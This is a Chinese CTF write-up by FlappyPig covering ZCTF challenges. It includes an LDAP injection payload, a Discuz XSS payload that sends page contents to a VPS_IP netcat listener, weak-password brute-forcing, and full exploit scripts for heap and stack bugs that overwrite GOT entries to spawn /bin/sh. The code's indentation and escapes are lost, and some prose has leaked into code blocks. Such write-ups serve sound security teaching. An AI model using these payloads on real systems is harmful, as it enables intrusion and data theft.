> 原文链接: https://www.anquanke.com//post/id/83371 


# ZCTF Writeup


                                阅读量   
                                **268652**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



**[![](https://p1.ssl.qhimg.com/t013986b2f0f79ea2fe.png)](https://p1.ssl.qhimg.com/t013986b2f0f79ea2fe.png)**

**author:FlappyPig**

**MISC**

xctf 竞赛规则

这个题的脑洞 简直。。。

主要看spacing    可以看到3种间距  -2 0 2     于是推算 -2和2的时候 

一个烫=一个0或者一个1

[![](https://p1.ssl.qhimg.com/t014cc92b08fef20d4b.png)](https://p1.ssl.qhimg.com/t014cc92b08fef20d4b.png)

猜测开头

[![](https://p5.ssl.qhimg.com/t01d1935e6f3e2a0720.png)](https://p5.ssl.qhimg.com/t01d1935e6f3e2a0720.png)

发现完全吻合之后 把所有168个烫都转换为二进制  最后8个二进制输出一个字符

得到flag

[![](https://p5.ssl.qhimg.com/t016d7f949eaa97d8d3.png)](https://p5.ssl.qhimg.com/t016d7f949eaa97d8d3.png)

       ZCTF`{`C0nnE_ON_B4BUj!`}`

<br>

**Android200**

首先出现的是登陆窗口,检查登录名密码的函数在这里

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01a594be79b1222c61.png)

使用Auth.auth函数验证用户名密码,this.databaseopt()函数获得加密用的密钥,该函数如下图,大概是从key.db中获取密钥

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01457e11b3b7bd129b.png)

下个log直接把key打印出来,是zctf`{`Notthis`}`,因此用户名是zctf,密码应该是`{`Notthis`}`。

这一步通过了之后会运行app这个类,里面会检查反调试,并且设置了退出时间,把相应退出的转跳判断改掉就不会退出了。最后程序会调用JNIclass.sayHelloInc

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t017d21266df0cf15a4.png)

用ida查看相关汇编

其中会调用Java_com_zctf_app_JNIclass_add_0()查看/proc/pid/status进行反调试,调试的时候把它的返回值改为0,即可绕过。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01178669b11892f526.png)

剩下的部分貌似是拼接/data/data/com.zctf.app/files/bottom和so文件内部的一个字符串,然后使用des解密。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01cba0457758262edf.png)

这里直接用gdb dump出解密后的值即可,是一张图片。用stegsolve打开即可看到flag。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t019ecefa5414525c98.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0110956fbe9bc90c63.png)

**WEB**

Web150 Easy Injection

一个登录框..测试了下感觉不像注入,cookie中有个sessionhint,发现是base32编码,解码发现是说不是sql注入,

扫 了下端口,发现存在389端口,ldap,参考drops的文章,用admin/*登录进后台,发现一个搜索,搜索a回显,0 admin, (| (uid=*a*))猜测是后端的语句,这里又有一个sessionhint解出来can you find my description,后来才发现 description是表名,于是根据drops文章一位一位盲注出。

payload:search=b*)(description=z

[![](https://p4.ssl.qhimg.com/t018d6124e00234e068.png)](https://p4.ssl.qhimg.com/t018d6124e00234e068.png)

Web200 加密的帖子

没啥好说的这题..你以为你换个DedeCMS的Logo我就认不出你是Discuz了么!

XSS漏洞,wooyun上有,在回复帖子的位置插入代码:

[flash]http://VPS_IP:9997/flash.swf?'+btoa(escape(document.body.innerHTML))+'[/flash]

VPS上nc监听9997端口,就能接收到数据了..

[![](https://p4.ssl.qhimg.com/t01aafdcfec7754f049.png)](https://p4.ssl.qhimg.com/t01aafdcfec7754f049.png)

解码之后就能看到flag

[![](https://p2.ssl.qhimg.com/t016d3f0f0b0901b222.png)](https://p2.ssl.qhimg.com/t016d3f0f0b0901b222.png)

老大知道flag

首先爆破常用姓名  最后可以登录zhangwei 123456

登录上去之后发现通讯录  还有md5过的cookie  解不开

[![](https://p3.ssl.qhimg.com/t01147fc63c5ea79ac0.png)](https://p3.ssl.qhimg.com/t01147fc63c5ea79ac0.png)

然后爆破通讯录里的弱口令

可以得到 niubenben  123456789

继续登录 发现cookie可以解  解完之后是 9+ADk-

可以推算老大 是1+xxxx    最后尝试多次发现+ADk- 是utf-7的编码  

于是构造老大的cookie

[![](https://p1.ssl.qhimg.com/t01261c22110032acba.png)](https://p1.ssl.qhimg.com/t01261c22110032acba.png)

再md5下   用burp发包 拿到flag 

[![](https://p4.ssl.qhimg.com/t0133e31ecac4f1f7f4.png)](https://p4.ssl.qhimg.com/t0133e31ecac4f1f7f4.png)

**PWN**

guess(pwn100):

题目逻辑比较简单,gets的缓冲区是栈上的,可以任意长度读入,而栈的缓冲区长度是40。如下:

[![](https://p0.ssl.qhimg.com/t01d1930333f78b9bbe.png)](https://p0.ssl.qhimg.com/t01d1930333f78b9bbe.png)

由于直接与flag相比较,所以这里flag是存在于内存中的。由于做了限制,必须以ZCTF`{`开头,而且长度一定,所以这里首先得暴力长度,根据返回的结果判断长度是否正确。

长度开始为33,后来改为34。

由 于栈的前面存在有主函数main(int argc, char** argv)的参数值,而这个参数argv[0]即为程序的名字,在异常时会显示在错 误信息后面,所以只要覆盖栈中argv[0]的地址为特定地址就可以达到任意地址泄露。所以可以泄露原flag的信息。

由 于::s(flag存放的地址)最后会与输入值做异或,所以最后只要反异或就可以。由于开始的时候ZCTF`{`这个地方异或后肯定为0,所以打印的时候,地 址应该往后靠点:如+5,另外选取的异或数也可能余flag中的相同,存在0截断,所以可以多打印些地址,这里直接选用‘b’,发现能够全部泄露出来(第五个5以后的)。

利用代码如下:



```
__author__ = "pxx"
#from zio import *
from pwn import *
#target = "./guess"
target = ("115.28.27.103", 22222)
def get_io(target):
#r_m = COLORED(RAW, "green")
#w_m = COLORED(RAW, "blue")
#io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
#io = process(target, timeout = 9999)
io = remote("115.28.27.103", 22222, timeout = 9999)
return  io 
def leak_len(io, length):
io.readuntil("please guess the flag:n")
flag_addr = 0x6010C0
payload = 'a' * length + "x00"
#io.gdb_hint()
io.writeline(payload)
result = io.readuntil("n")
print result
#io.close(0)
if "len error" in result:
return False
return True
def pwn(io):
#io.read_until("please guess the flag:n")
io.readuntil("please guess the flag:n")
"""
[stack] : 0x7fffff422210 --&gt; 0x73736575672f2e (b'./guess')
!![stack] : 0x7fffff421278 --&gt; 0x7fffff422210 --&gt; 0x73736575672f2e (b'./guess')
[stack] : 0x7fffff422ff0 --&gt; 0x73736575672f2e (b'./guess')
!![stack] : 0x7fffff4215e0 --&gt; 0x7fffff422ff0 --&gt; 0x73736575672f2e (b'./guess')
[stack] : 0x7fffc0eb7bfa --&gt; 0x73736575672f6e (b'n/guess')
[stack] : 0x7fffc0eb7ff0 --&gt; 0x73736575672f2e (b'./guess')
!![stack] : 0x7fffc0eb6c48 --&gt; 0x7fffc0eb7ff0 --&gt; 0x73736575672f2e (b'./guess')
arg[0]: 0x7fffc0eb67c0 ('a' &lt;repeats 15 times&gt;...)
"""
flag_addr = 0x6010C0 + 5 #+ 3 + 6
length = 34
payload = "ZCTF`{`"
payload = payload.ljust(length, 'b')
payload += "x00"
payload = payload.ljust(0x7fffff421278 - 0x7fffff421150, 'a')
#payload = payload.ljust(0x100, 'a')
payload += p64(flag_addr)
#payload = 'a' * (0x7fffc0eb68e8 - 0x7fffc0eb67c0) + p64(flag_addr)
raw_input()
#io.gdb_hint()
#io.writeline(payload)
#payload = 'a' * 0x50
io.writeline(payload)
#io.interact()
io.interactive()
"""
#leak length = 9
for i in range(32, 256):
print i
io = get_io(target)
if leak_len(io, i) == True:
break
exit(0)
"""
io = get_io(target)
pwn(io)
```

然后异或即可:



```
a = '0x07x03SSS;=x0cQQ&amp;=x16R=[x17x07x111=x04x0e"x05]x1fh'
result = []
for i in a:
result.append(chr(ord(i) ^ ord('b')))
print "".join(result)
```

结果:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01faee85afff0348b2.png)

flag: ZCTF`{`Rea111Y_n33D_t0_9uesS_fl@g?`}`

note1(pwn200):

这题比较简单,是个菜单式的交互程序,分析程序的结构体,得到如下:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01a64938b8c37030c6.png)

可见content的长度为256,而在edit的时候,能够读入512字节,从而发送缓冲区覆盖,如下:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0185a916de114c976f.png)

结构体中有指针,泄露和利用都比较容易,利用代码如下:



```
__author__ = "pxx"
from zio import *
from pwn import *
#target = "./note1"
target = ("115.28.27.103", 9001)
def get_io(target):
r_m = COLORED(RAW, "green")
w_m = COLORED(RAW, "blue")
io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
return  io 
def new_note(io, title_t, type_t, content_t):
io.read_until("option---&gt;&gt;n")
io.writeline("1")
io.read_until("title:n")
io.writeline(title_t)
io.read_until("type:n")
io.writeline(type_t)
io.read_until("content:n")
io.writeline(content_t)
def show_note(io):
io.read_until("option---&gt;&gt;n")
io.writeline("2")
def edit_note(io, title_t, content_t):
io.read_until("option---&gt;&gt;n")
io.writeline("3")
io.read_until("title:n")
io.writeline(title_t)
io.read_until("content:n")
io.writeline(content_t)
def pwn(io):
new_note(io, 'aaa', 'aaa', 'aaa')
new_note(io, 'bbb', 'bbb', 'bbb')
new_note(io, 'ccc', 'ccc', 'ccc')
show_note(io)
atoi_got = 0x0000000000602068 - 0x80
content= 'a' * 256 + l64(0x01) + l64(0x01) + l64(0x01) + l64(atoi_got) + "bbb"
io.gdb_hint()
edit_note(io, 'aaa', content)
show_note(io)
io.read_until("title=, type=, content=")
data = io.read_until("n")[:-1]
print [c for c in data]
data = data.ljust(8, 'x00')
malloc_addr = l64(data)
print "malloc_addr:", hex(malloc_addr)
elf_info = ELF("./libc-2.19.so")
malloc_offset = elf_info.symbols["malloc"]
system_offset = elf_info.symbols["system"]
libc_base = malloc_addr - malloc_offset
system_addr = libc_base + system_offset
content = "a" * 16 + l64(system_addr)
print "system_addr:", hex(system_addr)
edit_note(io, "", content)
io.read_until("option---&gt;&gt;n")
io.writeline("/bin/sh")
io.interact()
io = get_io(target)
pwn(io)
```



结果:

[![](https://p2.ssl.qhimg.com/t017f00741ac2521de7.png)](https://p2.ssl.qhimg.com/t017f00741ac2521de7.png)

flag: ZCTF`{`3n@B1e_Nx_IS_n0t_3norrugH!!`}`

note2(pwn400):

这道题也是菜单式的形式,主要问题在于edit的时候,append可以越界,如下图:

[![](https://p1.ssl.qhimg.com/t01d546b6394e9c80de.png)](https://p1.ssl.qhimg.com/t01d546b6394e9c80de.png)

如果size开始为0,那么size – strlen(dest) + 14 &lt;= 14 了,所以最后strncat的时候,可以无限附加,覆盖下个堆块,当size为0的时候,默认会分配的堆块大小为0x20,由于每个堆块的大小可以自己设 置大小,所以这里采用fastbin(堆块大小为0x20~0x80),由于可以覆盖后面的堆块,所以可以伪装假堆块在name中,然后对其进行free,再次申请的时候,就可以得到该地址,从而改写全局指针,如下:

[![](https://p1.ssl.qhimg.com/t01a501eb2ad6d62ca1.png)](https://p1.ssl.qhimg.com/t01a501eb2ad6d62ca1.png)

最终利用代码如下:



```
__author__ = "pxx"
from zio import *
from pwn import *
#ip = 1.192.225.129
#target = "./note2"
target = ("115.28.27.103", 9002)
def get_io(target):
r_m = COLORED(RAW, "green")
w_m = COLORED(RAW, "blue")
io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
return  io 
def new_note(io, length_t, content_t):
io.read_until("option---&gt;&gt;n")
io.writeline("1")
io.read_until("content:(less than 128)n")
io.writeline(str(length_t))
io.read_until("content:n")
io.writeline(content_t)
def show_note(io, id_t):
io.read_until("option---&gt;&gt;n")
io.writeline("2")
io.read_until("id of the note:n")
io.writeline(str(id_t))
def delete_note(io, id_t):
io.read_until("option---&gt;&gt;n")
io.writeline("2")
io.read_until("id of the note:n")
io.writeline(str(id_t))
def edit_note(io, id_t, type_t, content_t):
io.read_until("option---&gt;&gt;n")
io.writeline("3")
io.read_until("id of the note:n")
io.writeline(str(id_t))
io.read_until("[1.overwrite/2.append]n")
io.writeline(str(type_t))
io.read_until("Contents:")
io.writeline(content_t)
def pwn(io):
name_addr = 0x6020E0
address_addr = 0x602180
address = 'aaa'
name  = l64(0x20) + l64(0x21)
name = name.ljust(0x20, 'a')
name += l64(0x20) + l64(0x21)
name += l64(0x0)
io.read_until("Input your name:n")
io.writeline(name)
io.read_until("Input your address:n")
io.writeline(address)
new_note(io, 0, '')
new_note(io, 0x80, '')
atoi_got = 0x0000000000602088
manage_addr = 0x602120
payload = 'a' * 0x10
for i in range(7):
edit_note(io, 0, 2, payload)
payload = 'a' * 0xf
edit_note(io, 0, 2, payload)
payload = 'a' + l64(name_addr + 0x10)
edit_note(io, 0, 2, payload)
io.gdb_hint()
new_note(io, 0, '')
payload = 'a' * 0x10
for i in range(2):
edit_note(io, 2, 2, payload)
payload = 'a' * 0xf
edit_note(io, 2, 2, payload)
payload = 'a' + l64(atoi_got)
edit_note(io, 2, 2, payload)
show_note(io, 0)
io.read_until('Content is ')
data = io.read_until("n")[:-1]
print [c for c in data]
data = data.ljust(8, 'x00')
aoti_addr = l64(data)
print "aoti_addr:", hex(aoti_addr)
elf_info = ELF("./libc-2.19.so")
#elf_info = ELF("./libc.so.6")
atoi_offset = elf_info.symbols["atoi"]
system_offset = elf_info.symbols["system"]
libc_base = aoti_addr - atoi_offset
system_addr = libc_base + system_offset
content = l64(system_addr)
print "system_addr:", hex(system_addr)
edit_note(io, 0, 1, content)
io.read_until("option---&gt;&gt;n")
io.writeline("/bin/sh")
io.interact()
io = get_io(target)
pwn(io)
```



结果

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01c2c8e2bd426387c5.png)

flag: ZCTF`{`C0ngr@tu1@tIoN_tewre0_PwN_8ug_19390#@!`}`

spell(pwn300):

这道题的逻辑还是比较简单的,读取用户数据,然后与从驱动中读到的数据进行对比,符合要求,则打印flag。

看驱动代码,发现有两个ioctl指令:

0x80086B01 –&gt; 返回8字节随机数

0x80086B02 –&gt; 返回时间字符串

如下:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01036926354079617b.png)

而时间在最初的时候会打印一次,但是这里只是精确到分钟。

对于用户输入的串,与驱动进行比较时,会有多轮次,长度符合规律,现将长度求出得56,每8字节为一组,与驱动中读出的数据进行异或,如果每次异或结果都为’zctfflag’,则成功。

问题所在:

读取用户输入的时候,会读取len+2的长度,而且将len+1的位置置为’n’,那么此时如果输入长度刚好为256,可以读取258个字节

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t011ec55df2181536c9.png)

而在cpy函数中,赋值结束时按照’n’来定的,所以可以赋值257个字节,如下:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01d546b6394e9c80de.png)

而dest_buff缓冲区只有256个字节,其后跟着v13,它为第二次获取驱动中数据函数ioctl的指令代码,如下: 

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01a501eb2ad6d62ca1.png)

所以可以覆盖其最低字节,那么此时如果将最后一字节其覆盖成0x02,则获取的结果就是8字节的时间,而时间是8字节的,而且是以分钟为精度的,所以可以将第一次的时间近似看成第二次的时间,从而构造合适的输入数据。

利用代码如下:



```
__author__ = "pxx"
from zio import *
target = ("115.28.27.103", 33333)
def get_io(target):
r_m = COLORED(RAW, "green")
w_m = COLORED(RAW, "blue")
io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
#io = process(target, timeout = 9999)
return  io
def pwn(io):
io.read_until("How long of your spell:")
io.writeline("256")
io.read_until("At ")
time_info = io.read_until(": ")
io.read_until("you enter the spell: ")
time_info = time_info + "x00"
info = "zctfflag"
result = []
padding = ""
for i in range(8):
padding += chr(ord(time_info[i]) ^ ord(info[i]))
payload = padding * 7
payload += "x00"
payload = payload.ljust(256, 'a')
payload += 'x02'
io.writeline(payload)
io.interact()
io = get_io(target)
pwn(io)
```



结果:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01b908d41ddd93ac54.png)

flag: ZCTF`{`SPELL_IS_IN_THE_D33wRIVER`}`

note3(pwn300):

该题是note系列第三个,问题依然在edit中,如下图:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0195c703586bd6be83.png)

其中输入的id经过一些列运算,其中get_long函数中,转换是atol,而发行len&lt;0时,将len=-len,这里有个整数型溢出问题,因为0x8000000000000000 = -0x8000000000000000。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0103ab745139f1da87.png)

而0x8000000000000000的值为-1,所以可以导致索引为全局结构体数组中的前一个指针。其为当前的活跃指针,如下:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t019378bcac8b09e9fd.png)

edit的时候:id_t为-1;其对应的长度不在是size,第七个堆块的指针所以可以读很长的内容,从而覆盖后面的堆块,如下:

get_buff_4008DD(global_content_size_6020C8[id_t], (__int64)(&amp;global_cur_ptr_6020C0)[8 * (id_t + 8)], 10);

global_cur_ptr_6020C0 = global_content_size_6020C8[id_t];

在这里可以采用unlink的方式,在内容中构造假堆块,最终改写全局指针。

利用代码如下:



```
__author__ = "pxx"
from zio import *
from pwn import *
#ip = 1.192.225.129
#target = "./note3"
target = ("115.28.27.103", 9003)
def get_io(target):
r_m = COLORED(RAW, "green")
w_m = COLORED(RAW, "blue")
io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
return  io 
def new_note(io, length_t, content_t):
io.read_until("option---&gt;&gt;n")
io.writeline("1")
io.read_until("content:(less than 1024)n")
io.writeline(str(length_t))
io.read_until("content:n")
io.writeline(content_t)
def delete_note(io, id_t):
io.read_until("option---&gt;&gt;n")
io.writeline("4")
io.read_until("id of the note:n")
io.writeline(str(id_t))
def edit_note(io, id_t, content_t):
io.read_until("option---&gt;&gt;n")
io.writeline("3")
io.read_until("id of the note:n")
io.writeline(str(id_t))
io.read_until("content:")
io.writeline(content_t)
def pwn(io):
new_note(io, 0x80, 'aaaaaa')
new_note(io, 0x80, 'bbbbbb')
new_note(io, 0x80, 'cccccc')
new_note(io, 0x80, 'dddddd')
new_note(io, 0x80, 'eeeeee')
new_note(io, 0x80, 'ffffff')
new_note(io, 0x80, '/bin/sh;')
target_id = 2
edit_note(io, target_id, '111111')
#useful_code --- begin
#prepare args
arch_bytes = 8
heap_buff_size = 0x80
#node1_addr = &amp;p0
node1_addr = 0x6020C8 + 0x08 * target_id
pack_fun = l64
heap_node_size = heap_buff_size + 2 * arch_bytes #0x88
p0 = pack_fun(0x0)
p1 = pack_fun(heap_buff_size + 0x01)
p2 = pack_fun(node1_addr - 3 * arch_bytes)
p3 = pack_fun(node1_addr - 2 * arch_bytes)
#p[2]=p-3
#p[3]=p-2
#node1_addr = &amp;node1_addr - 3
node2_pre_size = pack_fun(heap_buff_size)
node2_size = pack_fun(heap_node_size)
data1 = p0 + p1 + p2 + p3 + "".ljust(heap_buff_size - 4 * arch_bytes, '1') + node2_pre_size + node2_size
#useful_code --- end
#edit node 1:overwrite node 1 -&gt; overflow node 2
edit_note(io, -9223372036854775808, data1)
#edit_note(io, 1, score, data1)
#delete node 2, unlink node 1 -&gt; unlink
#delete_a_restaurant(io, 2)
delete_note(io, target_id + 1)
alarm_got = 0x0000000000602038
puts_plt = 0x0000000000400730
free_got = 0x0000000000602018
data1 = l64(0x0) + l64(alarm_got) + l64(free_got) + l64(free_got)
edit_note(io, target_id, data1)
data1 = l64(puts_plt)[:6]
io.gdb_hint()
edit_note(io, target_id, data1)
#io.read_until("option---&gt;&gt;n")
#io.writeline("3")
#io.read_until("id of the note:n")
#io.writeline(l64(atol_got))
#data = io.read_until("n")
#print [c for c in data]
delete_note(io, 0)
data = io.read_until("n")[:-1]
print [c for c in data]
alarm_addr = l64(data.ljust(8, 'x00'))
print "alarm_addr:", hex(alarm_addr)
elf_info = ELF("./libc-2.19.so")
#elf_info = ELF("./libc.so.6")
alarm_offset = elf_info.symbols["alarm"]
system_offset = elf_info.symbols["system"]
libc_base = alarm_addr - alarm_offset
system_addr = libc_base + system_offset
data = l64(system_addr)[:6]
edit_note(io, 1, data)
delete_note(io, 6)
io.interact()
io = get_io(target)
pwn(io)
```



结果:

[![](https://p1.ssl.qhimg.com/t010e3ec688833ca85c.png)](https://p1.ssl.qhimg.com/t010e3ec688833ca85c.png)

flag: ZCTF`{`No_s1-1Ow_n0dfs_1eak!@#`}`

<br>

**REVERSE**

Reverese100

这个题最开始是个矩阵运行,算了半天算出来flag为zctf`{`Wrong_Flag`}`,明显不对。继续往后分析,真正的代码在后面。



```
value = '32 02 00 00 85 02 00 00 F4 02 00 00 53 03 00 00 98 03 00 00 F9 03 00 00 6C 04 00 00 E5 04 00 00 44 05 00 00 93 05 00 00 FB 05 00 00 5A 06 00 00 A1 06 00 00 10 07 00 00 74 07 00 00 F1 07 00 00'
d = ''
for l in value.split(' '):
    d += chr(int(l, 16))
print len(d)
from zio import *
d2 = []
d0 = ord('z')+ord('c')+ord('t')+ord('f')
d2.append(d0)
for i in range(len(d)/4):
    d2.append(l32(d[i*4:i*4+4]))
flag = ''
for i in range(len(d2)-1):
    flag += chr(d2[i+1]-d2[i])
print 'zctf'+flag
Reverse200
Flag形式如下:ZCTF`{`123_4567_abc_defghijklm`}`
其中123对应的md5为371265e33e8d751d93b148067c36eb4c,对应的3的字符为c0c
4567处对应的4个字符+一个’x00’的md5为'03d2370991fbbb9101dd7dcf4b03d619',求得4567处对应LIK3.
md5str = '03d2370991fbbb9101dd7dcf4b03d619'
for a1 in range(0x20, 0x7f):
    for a2 in range(0x20, 0x7f):
        for a3 in range(0x20, 0x7f):
            for a4 in range(0x20, 0x7f):
                src = chr(a1) + chr(a2) + chr(a3) + chr(a4) + 'x00'
                m2 = hashlib.md5()
                m2.update(src)
                if m2.hexdigest() == md5str:
                    print 'find'
print src
```



abc处的3个字符做了base64加密之后进行比较,求得为E4t.

经过上面的比较后,程序用de处的两个字符对subkey文件内容进行异或,输出到subsubkey中。

再后面对整个flag做了次md5。但是因为整个flag中有10个字节不知道,爆破不太现实。

感觉subsubkey文件应该是有意义的,通过枚举de处的所有可能,得到所有的输出,通过file命令发现当de为ST时,subsubkey为一个rar文件,解压出来有剩下的8个字符。

Flag为:ZCTF`{`c0c_LIK3_E4t_ST6aw4ErrY`}`E4t.

<br>

Reverse300

Arm64的程序,最近新出的ida6.9支持arm64反编译,不过可惜没有正版ida。

看了下主要函数就几个,所以选择直接看汇编了。结合qemu,可以进行动态调试。

首先,ida对arm64程序的库函数识别不是很好(用的ida6.6),通过readelf解析出来的库函数对ida中的库函数手动修正。

之后就是纯看代码了,大概弄清楚了程序流程:

首先将输入的字符串每3个一组,变换成4个字节,得到buff2.

Buff2中每5个字节一组,做了一个矩阵乘法,得到buff3.

Buff3与固定字符串比较。代码大致如下:



```
flag = 'zctf`{`1234567890`}`'.ljust(18, 'x00')
d9 = []
for i in range(len(flag)/3):
    d  = (ord(flag[3*i])&lt;&lt;16)+(ord(flag[3*i+1])&lt;&lt;8)+ord(flag[3*i+2])
    #print d,
    d1 = (d&gt;&gt;18)&amp;0x3f
    d2 = (d&gt;&gt;12)&amp;0x3f
    d3 = (d&gt;&gt;6)&amp;0x3f
    d4 = d &amp; 0x3f
    print hex(d1), hex(d2), hex(d3), hex(d4)
    if d1 != 0:
        d9.append(d1)
    if d2 != 0:
        d9.append(d2)
    if d3 != 0:
        d9.append(d3)
    else:
        d9.append(0x40)
    if d4 != 0:
        d9.append(d4)
    else:
        d9.append(0x40)
d8 = [21, 8, 24, 7, 1, 25, 4, 20, 16, 0, 2, 13, 16, 10, 14, 18, 3, 20, 18, 25, 3, 12, 23, 0, 24]
for i in range(len(d9)/5):
    for j in range(5):
        a = d9[i*5]*d8[j*5]+d9[i*5+1]*d8[j*5+1]+d9[i*5+2]*d8[j*5+2]+d9[i*5+3]*d8[j*5+3]+d9[i*5+4]*d8[j*5+4]
        print hex(a)
```



逆向代码:



```
